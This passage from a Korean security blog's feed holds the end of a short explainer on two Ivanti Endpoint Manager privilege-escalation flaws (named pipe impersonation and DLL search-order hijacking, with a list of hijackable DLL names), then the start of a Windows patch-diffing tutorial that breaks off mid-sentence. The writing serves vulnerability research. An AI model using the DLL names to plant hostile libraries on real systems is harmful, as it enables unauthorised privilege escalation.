    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.jumpsec.com/detecting-known-dll-hijacking-and-named-pipe-token-impersonation-attacks-with-sysmon/">Detecting known DLL hijacking and named pipe token impersonation attacks with Sysmon</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Ivanti Unified Endpoint Manager &lt;= 2020.1.1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><strong>CVE-2020-13770: Named pipe token impersonation</strong></p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; named pipe object&#xB97C; &#xC5F4; &#xB54C; &#xBCF4;&#xC548; attribute&#xAC00; &#xBD80;&#xC801;&#xC808;&#xD558;&#xC5EC; &#xBC1C;&#xC0DD;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. </p><p><code>CreateFile</code>&#xC758; <code>dwFlagsAndAttributes</code> &#xC778;&#xC790;&#xAC00; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; attribute&#xC77C; &#xB54C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>SECURITY_DELEGATION</li><li>SECURITY_IMPERSONATION</li></ul><p>&#xC704;&#xC758; &#xB450; attribute &#xC911; &#xD558;&#xB098;&#xB85C; named pipe&#xB97C; &#xC5F4;&#xBA74; &#xC11C;&#xBC84;&#xB294; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xD1A0;&#xD070;&#xC744; &#xC5BB;&#xACE0; &#xCD94;&#xD6C4; access check&#xC5D0; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. pipe &#xC11C;&#xBC84;&#xB294; pipe &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC758; &#xAD8C;&#xD55C;, security context &#xB4F1;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xC11C;&#xBC84;&#xBCF4;&#xB2E4; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC758; &#xAD8C;&#xD55C;&#xC774; &#xB192;&#xC73C;&#xBA74; &#xC11C;&#xBC84;&#xB294; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>CVE-2020-13771: DLL search order hijacking</strong></p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC708;&#xB3C4;&#xC6B0;&#xC758; <a href="https://docs.microsoft.com/ko-kr/windows/win32/dlls/dynamic-link-library-search-order">DLL Search Order</a>&#xB97C; &#xC774;&#xC6A9;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. <code>SafeDllSearchMode</code> &#xC124;&#xC815;&#xC5D0; &#xAD00;&#xACC4;&#xC5C6;&#xC774; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; DLL &#xD30C;&#xC77C;&#xC744; &#xCC3E;&#xC9C0; &#xBABB;&#xD558;&#xBA74; &#xD658;&#xACBD; &#xBCC0;&#xC218; PATH&#xC5D0;&#xC11C; &#xD30C;&#xC77C;&#xC744; &#xCC3E;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xAC00; &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xC5D0; &#xB4F1;&#xB85D;&#xB41C; &#xD3F4;&#xB354;&#xC5D0; &#xC870;&#xC791;&#xB41C; DLL &#xD30C;&#xC77C;&#xC744; &#xBC30;&#xCE58;&#xD558;&#xBA74; &#xCDE8;&#xC57D;&#xD55C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xD574;&#xB2F9; DLL&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xADF8; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; context&#xB85C; <code>DllMain</code>&#xC774; &#xC2E4;&#xD589;&#xB418;&#xC5B4; &#xAD8C;&#xD55C;&#xC0C1;&#xC2B9;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xC545;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; dll &#xD30C;&#xC77C;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>ldprofileui.dll</li><li>wfapi.dll</li><li>DMIAPI32.DLL</li><li>logonsrv.dll</li><li>OOBCredentials.dll</li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>eop</tag>
      
      <tag>named pipe</tag>
      
      <tag>dll hijacking</tag>
      
      <tag>idioth</tag>
      
      <tag>dll search order</tag>
      
      <tag>impersonation attack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Windows Patch Diffing 맛보기 Part 1</title>
    <link href="/2020/11/15/l0ch/windows-patch-diffing-part1/"/>
    <url>/2020/11/15/l0ch/windows-patch-diffing-part1/</url>
    
    <content type="html"><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! L0ch&#xC785;&#xB2C8;&#xB2E4;. &#xC800;&#xBC88; <a href="https://hackyboiz.github.io/2020/11/01/l0ch/cve-2020-1464/">GlueBall &#xCDE8;&#xC57D;&#xC810;</a> &#xAE00; &#xC37C;&#xC744; &#xB54C; &#xB514;&#xD551; &#xD560; &#xBC84;&#xC804;&#xBCC4; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xAD6C;&#xD558;&#xB2E4;&#xAC00; &#xBA58;&#xD0C8;&#xC774; &#xD30C;&#xC1C4;&#xAE30;&#xC5D0; &#xAC08;&#xB9B0; &#xC885;&#xC774;&#xB9C8;&#xB0E5; &#xAC08;&#xB9B4; &#xBED4;&#xD588;&#xC8E0;?</p><p>&#xC0DD;&#xAC01;&#xD574;&#xBCF4;&#xB2C8;&#xAE4C; &#xAD1C;&#xD788; Diffing &#xD558;&#xACA0;&#xB2E4;&#xACE0; &#xAC74;&#xB4DC;&#xB838;&#xB2E4;&#xAC00; X&#xACE0;&#xC0DD;&#xD588;&#xB294;&#xB370; &#xC774;&#xB300;&#xB85C; &#xAC00;&#xB9CC;&#xD788; &#xC788;&#xC73C;&#xBA74; &#xC660;&#xC9C0; &#xC5B5;&#xC6B8;&#xD558;&#xC790;&#xB098;&#xC5EC;. &#xADF8;&#xB798;&#xC11C; &#xC774; &#xCC38;&#xC5D0; &#xC880; &#xC27D;&#xAC8C; &#xC27D;&#xAC8C; &#xAC08; &#xC218; &#xC788;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xCC3E;&#xB290;&#xB77C; &#xBC29;&#xD669;&#xD558;&#xB358; &#xC911; &#xC5C4;&#xCCAD;&#xB09C; &#xAE00;&#xC744; &#xBC1C;&#xACAC;&#xD558;&#xAC8C; &#xB418;&#xB294;&#xB370;..</p><p><a href="https://wumb0.in/extracting-and-diffing-ms-patches-in-2020.html">Extracting and Diffing Windows Patches in 2020</a></p><p>&#xC774;&#xAC70; &#xC644;&#xC804; &#xB098;&#xB97C; &#xC704;&#xD55C; &#xAE00;&#xC774;&#xC796;&#xC544;??&#x314E;</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/1.png" alt></p><p>&#xADF8;&#xB798;&#xC11C;! &#xBC14;&#xB85C; &#xC815;&#xB9AC;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC14;&#xC8E0;. &#xC55E;&#xC73C;&#xB85C; &#xD560; &#xC0BD;&#xC9C8;&#xC740; &#xAFC8;&#xC5D0;&#xB3C4; &#xBAA8;&#xB978; &#xCC44; &#x314B;&#x314B; &#xC544;</p><h1 id="Diffing-&#xC774;-&#xBB54;&#xB370;"><a href="#Diffing-&#xC774;-&#xBB54;&#xB370;" class="headerlink" title="Diffing &#xC774; &#xBB54;&#xB370;?"></a>Diffing &#xC774; &#xBB54;&#xB370;?</h1><p>&#xAC04;&#xB2E8;&#xD558;&#xAC8C; Binary Diffing&#xC774; &#xBB54;&#xC9C0; &#xC9DA;&#xACE0; &#xB118;&#xC5B4;&#xAC00; &#xBD05;&#xC2DC;&#xB2E4;!</p><blockquote><p>Diffing &#xC740; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xCEF4;&#xD4E8;&#xD130;&#xC5D0;&#xC11C; &#xB450; &#xAC1C; &#xD30C;&#xC77C;&#xC758; &#xCC28;&#xC774;&#xB97C; &#xBCF4;&#xC5EC;&#xC8FC;&#xB294; &#xC6A9;&#xC5B4;&#xB2E4;. (Ex : git diff - Git&#xC758; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC; difference &#xD655;&#xC778;) &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xBD84;&#xC11D; &#xAE30;&#xBC95;(Binary Diffing)&#xC73C;&#xB85C;&#xB3C4; &#xC4F0;&#xC774;&#xB294;&#xB370;, &#xD328;&#xCE58; &#xB610;&#xB294; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC640; &#xAE30;&#xC874; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xBE44;&#xAD50;&#xD574;&#xC11C; &#xC5B4;&#xB5A4; &#xCF54;&#xB4DC;&#xAC00; &#xBCC0;&#xACBD;&#xB418;&#xC5C8;&#xB294;&#xC9C0;, &#xC5B4;&#xB5A4; &#xD568;&#xC218;&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xACE0; &#xC81C;&#xAC70;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xB4F1; &#xBC84;&#xC804; &#xBCC4; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC758; &#xCC28;&#xC774;&#xC810;&#xC744; &#xC54C; &#xC218; &#xC788;&#xB294; &#xBD84;&#xC11D; &#xAE30;&#xBC95;&#xC774;&#xB2E4;.</p></blockquote><p>&#xD55C;&#xB9C8;&#xB514;&#xB85C; &#xC598;&#xB124;&#xAC00; &#xBB50;&#xB97C; &#xC5B4;&#xB5BB;&#xAC8C; &#xD328;&#xCE58;&#xD588;&#xB098;~ &#xBC14;&#xB010; &#xBD80;&#xBD84;&#xB9CC; &#xC4F1; &#xB458;&#xB7EC;&#xBCF4;&#xB294; &#xBD84;&#xC11D; &#xAE30;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;. &#xBCC4; &#xAC70; &#xC5C6;&#xC5B4; &#xBCF4;&#xC774;&#xC9C0;&#xB9CC; Diffing&#xC744; &#xD558;&#xBA74;&#xC11C; &#xD328;&#xCE58;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD55C; &#xC0C8;&#xB85C;&#xC6B4; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xB098;, &#xAE30;&#xC874; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD574; &#xC801;&#xC6A9;&#xD55C; &#xD328;&#xCE58;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xBC29;&#xBC95; &#xB4F1;&#xC744; &#xD6A8;&#xC728;&#xC801;&#xC73C;&#xB85C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC624;&#xB298;&#xC740; &#xC55E;&#xC11C; &#xB9D0;&#xD55C; &#xAC83;&#xCC98;&#xB7FC; Windows Update &#xD328;&#xCE58;&#xB97C; &#xCD94;&#xCD9C;&#xD558;&#xACE0; &#xCD94;&#xCD9C;&#xD55C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD30C;&#xC77C;&#xC744; &#xC774;&#xC6A9;&#xD574; Diffing&#xC744; &#xC9C4;&#xD589;&#xD574; &#xBCFC;&#xAC8C;&#xC694;.</p><h1 id="Windows-Update-Package"><a href="#Windows-Update-Package" class="headerlink" title="Windows Update Package"></a>Windows Update Package</h1><h2 id="Microsoft-Update-Catalog"><a href="#Microsoft-Update-Catalog" class="headerlink" title="Microsoft Update Catalog"></a>Microsoft Update Catalog</h2><p>&#xC708;&#xB3C4;&#xC6B0;&#xB294; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD328;&#xD0A4;&#xC9C0;&#xB97C; &#xBC30;&#xD3EC;&#xD574; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xB97C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>Windows 10 &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xBC84;&#xC804; &#xBCC4;&#xB85C; &#xB098;&#xB204;&#xC5B4; &#xBC30;&#xD3EC;&#xD558;&#xACE0; &#xC788;&#xC73C;&#xBA70; &#xC624;&#xB298;&#xC740; &#xB2E4;&#xC74C; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs markdown">Windows 10 ver1903, 64bit</code></pre><p>&#xBC84;&#xC804;&#xC5D0; &#xB530;&#xB77C; &#xBC1B;&#xC544;&#xC57C; &#xD558;&#xB294; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD30C;&#xC77C;&#xC774; &#xB2E4;&#xB974;&#xB2C8; &#xCC38;&#xACE0;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;!</p><p>&#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xC708;&#xB3C4;&#xC6B0;&#xB294; &#xC790;&#xB3D9; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xBC29;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0;&#xB9CC; &#xC708;&#xB3C4;&#xC6B0; &#xCE74;&#xD0C8;&#xB85C;&#xADF8;&#xC5D0;&#xC11C; &#xB3C5;&#xB9BD; &#xC2E4;&#xD589;&#xD615; &#xD328;&#xCE58; &#xD328;&#xD0A4;&#xC9C0;&#xB97C; &#xBC1B;&#xC544; &#xC218;&#xB3D9; &#xC124;&#xCE58;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC708;&#xB3C4;&#xC6B0; &#xCE74;&#xD0C8;&#xB85C;&#xADF8; : <a href="https://www.catalog.update.microsoft.com/Home.aspx">https://www.catalog.update.microsoft.com/Home.aspx</a></p><p>Windows &#xCE74;&#xD0C8;&#xB85C;&#xADF8;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xD615;&#xC2DD;&#xC758; &#xAC80;&#xC0C9; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lisp">YYYY-MM release-number (<span class="hljs-name">x86</span><span class="hljs-name">|x64|</span><span class="hljs-name">ARM64</span>) cumulative</code></pre><p>&#xC81C; &#xC708;&#xB3C4;&#xC6B0;&#xB294; 1903, 64bit &#xC774;&#xBBC0;&#xB85C; 8&#xC6D4; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xCC3E;&#xAE30; &#xC704;&#xD574; &#xC544;&#xB798; &#xD0A4;&#xC6CC;&#xB4DC;&#xB85C; &#xAC80;&#xC0C9;&#xC744; &#xD574;&#xBCFC;&#xAC8C;&#xC694;.</p><pre><code class="hljs angelscript"><span class="hljs-number">2020</span><span class="hljs-number">-08</span> <span class="hljs-number">1903</span> x64 cumulative</code></pre><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/2.png" alt></p><p>&#xAC80;&#xC0C9;&#xC744; &#xD558;&#xBA74; &#xC774;&#xB807;&#xAC8C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xBAA9;&#xB85D;&#xB4E4;&#xC774; &#xC8FC;&#xB974;&#xB975; &#xB728;&#xB294;&#xB370;, Diffing &#xD558;&#xAE38; &#xC6D0;&#xD558;&#xB294; &#xD30C;&#xC77C;&#xC774; &#xD328;&#xCE58;&#xB41C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD56D;&#xBAA9;&#xC744; &#xBC1B;&#xC73C;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC804; <code>KB4565351</code> &#xC744; &#xBC1B;&#xB3C4;&#xB85D; &#xD560;&#xAC8C;&#xC694;.</p><h1 id="Extract-Update-Package"><a href="#Extract-Update-Package" class="headerlink" title="Extract Update Package"></a>Extract Update Package</h1><p>&#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD30C;&#xC77C;&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD558;&#xBA74; <code>msu</code> &#xD655;&#xC7A5;&#xBA85;&#xC758; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD328;&#xD0A4;&#xC9C0;&#xB97C; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xD328;&#xD0A4;&#xC9C0;&#xC5D0;&#xC11C; &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xCD94;&#xCD9C;&#xD574;&#xB0B4;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="Extract-msi"><a href="#Extract-msi" class="headerlink" title="Extract msi"></a>Extract msi</h2><p>PowerShell&#xC5D0;&#xC11C; <code>expand.exe -F:* &quot;[msu file name]&quot; .\\ext\\</code> &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xD328;&#xCE58; &#xCEE8;&#xD150;&#xCE20;&#xB4E4;&#xC744; &#xCD94;&#xCD9C;&#xD558;&#xBA74; &#xC544;&#xB798; &#xC0AC;&#xC9C4;&#xACFC; &#xAC19;&#xC774; ext &#xD3F4;&#xB354; &#xC548;&#xC5D0; &#xCD94;&#xCD9C;&#xB41C; &#xD30C;&#xC77C;&#xB4E4;&#xC774; &#xC788;&#xB294; &#xAC78; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;~</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/3.png" alt></p><p>cab&#xD30C;&#xC77C;&#xC774; &#xBCF4;&#xC774;&#xB294;&#xAD70;&#xC694;, &#xC774;&#xAC83;&#xB3C4;  &#xC5ED;&#xC2DC; expand&#xB85C; &#xC4F1;&#xC2F9; &#xCD94;&#xCD9C;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;!</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/4.png" alt></p><p>..?? &#xC65C; &#xC544;&#xBB34; &#xBC18;&#xC751;&#xC774; &#xC5C6;&#xC9C0;..?</p><p>&#xC544; &#xC65C; &#xC548;&#xB418;&#xB098; &#xD588;&#xB354;&#xB2C8; &#xC880; &#xC624;&#xB798; &#xAC78;&#xB9AC;&#xB098; &#xBCF4;&#xAD70;&#xC694; &#xAE30;&#xB2E4;&#xB824; &#xBD05;&#xC2DC;&#xB2E4; &#x314E;</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/5.png" alt></p><p>&#xADF8;&#xB807;&#xAC8C; <del>2000&#xB144; &#xAC19;&#xC740;</del> &#xD55C; &#xC2DC;&#xAC04;&#xC774; &#xC9C0;&#xB098;&#xACE0;.. &#xD55C; 20&#xBD84; &#xC815;&#xB3C4; &#xAE30;&#xB2E4;&#xB9AC;&#xB2E4;&#xAC00; &#xD3EC;&#xAE30;&#xD558;&#xACE0; &#xC800;&#xB141; &#xBA39;&#xACE0; &#xC624;&#xB2C8;&#xAE4C; &#xB05D;&#xB098; &#xC788;&#xB124;&#xC694;?</p><p>&#xC544;&#xB2C8; &#xBB50; &#xCD94;&#xCD9C; &#xC5BC;&#xB9C8;&#xB098; &#xD55C;&#xB2E4;&#xACE0; &#xC774;&#xB807;&#xAC8C; &#xC624;&#xB798; &#xAC78;&#xB9AC;&#xB0D0; &#xD558;&#xACE0; &#xCD94;&#xCD9C;&#xD55C; &#xD30C;&#xC77C; &#xAC1C;&#xC218;&#xB97C; &#xC138; &#xBD24;&#xB294;&#xB370;</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/6.png" alt></p><p>?? 3&#xB9CC;&#xAC1C;&#xC694;?</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/7.png" alt></p><p><em>&#xC544;&#xB2C8; &#xBBF8;&#xCE5C; &#x314E;&#x314E;</em></p><p>&#xB204;&#xC801; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD328;&#xD0A4;&#xC9C0;&#xB77C; &#xC9C0;&#xAE08;&#xAE4C;&#xC9C0;&#xC758; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB4E4;&#xC774; &#xBAA8;&#xB450; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC5B4; &#xC774;&#xB807;&#xAC8C; &#xB9CE;&#xB2E4;&#xACE0; &#xD558;&#xB124;&#xC694;&#x2026;? &#xCD94;&#xCD9C;&#xC740; &#xBC25;&#xB54C; &#xB9DE;&#xCDB0;&#xC11C; &#xB3CC;&#xB824;&#xB193;&#xACE0; &#xBC25; &#xBA39;&#xACE0; &#xC624;&#xBA74; &#xB420; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;&#x314B;&#x314B;;</p><h2 id="Extracted-files"><a href="#Extracted-files" class="headerlink" title="Extracted files"></a>Extracted files</h2><p><code>tree /F &gt;&gt; extract.txt</code> &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xC5B4;&#xB5A4; &#xD30C;&#xC77C;&#xB4E4;&#xC774; &#xCD94;&#xCD9C; &#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD2B8;&#xB9AC; &#xAD6C;&#xC870;&#xB85C; &#xD655;&#xC778;&#xD574; &#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;!</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/8.png" alt></p><p>&#xB2E4;&#xC591;&#xD55C; &#xD615;&#xC2DD;&#xC758; &#xD30C;&#xC77C;, &#xD3F4;&#xB354;&#xB4E4;&#xC774; &#xCD94;&#xCD9C;&#xB41C; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB124;&#xC694;.</p><ol><li><p>&#xD3F4;&#xB354; &#xC720;&#xD615;</p><p>&#xC811;&#xB450;&#xC5B4;&#xB85C; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xAC00; &#xBD99;&#xC74C;</p><ul><li>amd64, x86, wow64, msil</li></ul></li><li><p>&#xD30C;&#xC77C; &#xC720;&#xD615;</p><ul><li>manie</li><li>cat : &#xBCF4;&#xC548; &#xCE74;&#xD0C8;&#xB85C;&#xADF8;</li><li>mum : &#xCE74;&#xD0C8;&#xB85C;&#xADF8; &#xD30C;&#xC77C;&#xACFC; &#xC30D;&#xC744; &#xC774;&#xB8E8;&#xBA70; &#xBA54;&#xD0C0; &#xB370;&#xC774;&#xD130;&#xAC00; &#xD3EC;&#xD568;&#xB428;</li></ul></li></ol><p>&#xADF8;&#xB7F0;&#xB370;.. &#xAC01; &#xD328;&#xCE58; &#xD3F4;&#xB354; &#xC548;&#xC5D0; f&#xB791; r &#xD3F4;&#xB354;&#xAC00; &#xC788;&#xACE0;, &#xC774; &#xC548;&#xC5D0; &#xAC01;&#xAC01; &#xAC19;&#xC740; &#xC774;&#xB984;&#xC758; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xAC00; &#xBCF4;&#xC774;&#xB294;&#xB370;, &#xC774;&#xAC8C; &#xBB58;&#xAE4C;&#xC694;..?</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/9.png" alt></p><p>f, r &#xAC01; &#xD3F4;&#xB354;&#xB294; Differential &#xD3F4;&#xB354;&#xB85C;, &#xC138; &#xAC00;&#xC9C0; &#xC720;&#xD615;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>f: forward differential</li><li>r: reverse differential</li><li>n: null differential</li></ul><p>&#xC774;&#xB4E4;&#xC740; &#xAE30;&#xBCF8; &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xBCC0;&#xACBD;&#xB420; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD30C;&#xC77C;&#xACFC;&#xC758; &#xCC28;&#xC774;&#xB9CC;&#xD07C;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xB2F4;&#xACE0; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xBD80;&#xBD84;&#xC740; &#xC911;&#xC694;&#xD55C; &#xB0B4;&#xC6A9;&#xC774;&#xB77C; &#xB098;&#xC911;&#xC5D0; &#xB2E4;&#xC2DC; &#xC9DA;&#xC5B4; &#xBCF4;&#xB3C4;&#xB85D; &#xD560; &#xD14C;&#xB2C8;, &#xAF2D; &#xAE30;&#xC5B5;&#xD574; &#xB450;&#xC138;&#xC694;!</p><h2 id="WinSxS"><a href="#WinSxS" class="headerlink" title="WinSxS"></a>WinSxS</h2><p>Windows&#xB294; Windows&#xC640; WinSxS&#xB97C; &#xD1B5;&#xD574; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xBAA8;&#xB4E0; &#xC885;&#xB958;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>WinSxS&#xB294; manifest&#xB97C; &#xCC38;&#xC870;&#xD574; &#xD328;&#xCE58;&#xD558;&#xBA70; manifest&#xC5D0;&#xB294; &#xD328;&#xCE58; &#xC801;&#xC6A9; &#xBC29;&#xBC95;, &#xACB0;&#xACFC; &#xD30C;&#xC77C;&#xC758; &#xAD8C;&#xD55C;, &#xC124;&#xC815;&#xD560; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD0A4; &#xB4F1; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xC5D0; &#xB300;&#xD55C; &#xC804;&#xBC18;&#xC801;&#xC778; &#xB9AC;&#xC2A4;&#xD2B8; &#xC815;&#xBCF4;&#xAC00; &#xC788;&#xC5B4;&#xC694;. &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xD655;&#xC778;&#xD574; &#xBCFC;&#xAE4C;&#xC694;?</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/10.png" alt></p><p>Windows-Gaming-XboxLive-Storage-Service-Component&#xC5D0; &#xB300;&#xD55C; manifest &#xC815;&#xBCF4;&#xB97C; &#xC870;&#xD68C;&#xD55C; &#xACB0;&#xACFC;&#xC785;&#xB2C8;&#xB2E4;.</p><p>differential &#xD3F4;&#xB354;&#xC778; f, r&#xAC00; &#xC788;&#xACE0;, &#xAC01;&#xAC01;&#xC5D0; &#xD328;&#xCE58;&#xB420; dll&#xACFC; exe &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xAC00; &#xC788;&#xB294; &#xAC78; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;.</p><h1 id="&#xCD94;&#xCD9C;-&#xC790;&#xB3D9;&#xD654;"><a href="#&#xCD94;&#xCD9C;-&#xC790;&#xB3D9;&#xD654;" class="headerlink" title="&#xCD94;&#xCD9C; &#xC790;&#xB3D9;&#xD654;"></a>&#xCD94;&#xCD9C; &#xC790;&#xB3D9;&#xD654;</h1><p>&#xADF8;&#xB7F0;&#xB370; &#xB9D0;&#xC785;&#xB2C8;&#xB2E4;. &#xB2E4; &#xC88B;&#xC740;&#xB370;.. &#xCD94;&#xCD9C;&#xD55C; &#xD30C;&#xC77C; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xC880; &#xBCF4;&#xB824;&#xACE0; &#xD588;&#xB354;&#xB2C8; &#xC544;&#xD0A4;&#xD14D;&#xCC98; &#xBCC4;&#xB85C; &#xBD84;&#xB958;&#xB3C4; &#xC5C6;&#xACE0; &#xB4A4;&#xC8FD;&#xBC15;&#xC8FD; &#xAC1C;&#xD310;&#xC774;&#xB77C; &#xC9DC;&#xC99D; &#xB098;&#xB824;&#xACE0; &#xD558;&#xB124;,,^^</p><blockquote><p>&#xB0A0;&#xB85C; &#xBA39;&#xAE30; &#xC88B;&#xC544;&#xD558;&#xB294; L0ch&#xB294; &#xBC14;&#xB85C; &#xCD94;&#xCD9C;/&#xBD84;&#xB958; &#xC790;&#xB3D9;&#xD654; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC9DC;&#xAE30;&#xB85C; &#xD569;&#xB2C8;&#xB2E4;. &#xC5ED;&#xC2DC; &#xC6D0; &#xAC8C;&#xC2DC;&#xAE00;&#xC5D0;&#xB3C4; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xAC00; &#xC788;&#xAD70;&#xC694;!<br>&#xAE30;&#xC05C; 